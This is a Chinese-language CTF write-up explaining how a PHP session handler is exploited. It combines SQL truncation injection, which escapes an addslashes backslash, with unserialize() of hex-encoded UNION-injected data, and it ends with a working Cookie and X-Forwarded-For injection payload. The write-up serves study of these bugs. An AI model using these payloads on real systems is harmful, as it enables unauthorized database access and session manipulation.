此题是来自于一个某一个小众的CTF比赛，但是题目还是非常的好。

本题目考察的地方有几点：
1. SQL的截断注入逃逸出`\`
2. 反序列化漏洞

其中最为关键的地方是在于参数`$this->session_id`我们是可控的，就可以进行SQL注入。要保证能够顺利调用`load_session()`函数执行SQL语句，我们需要绕过
```PHP
$this->gen_session_key($tmp_session_id) == substr($this->session_id, 32);

function gen_session_key($session_id)
{
    static $ip = '';

    if ($ip == '')
    {
        $ip = substr($this->_ip, 0, strrpos($this->_ip, '.'));
    }

    return sprintf('%08x', crc32($ip . $session_id));
}
```
此时需要利用到代码中的截断32位字符的方法，得到`\`。之后代码通过反序列化得到数据。`$GLOBALS['_SESSION']  = unserialize($session['data']);`。那么我们需要将我们的数据序列化之后通过`union`的方式传入，但是考虑到数据经过了`addslashes()`，不能直接传入反序列化的内容，可以考虑传入十六进制的内容。

那么最后的writeup就是：
```
Cookie: SESSID=QYHuItTPcsD1yj4npiRWGvChx0FLBw6%002ad2457
X-Forwarded-For: /**/union select 0x613a323a7b733a343a226e616d65223b733a363a22686168616861223b733a353a2273636f7265223b733a333a22313032223b7d #
```

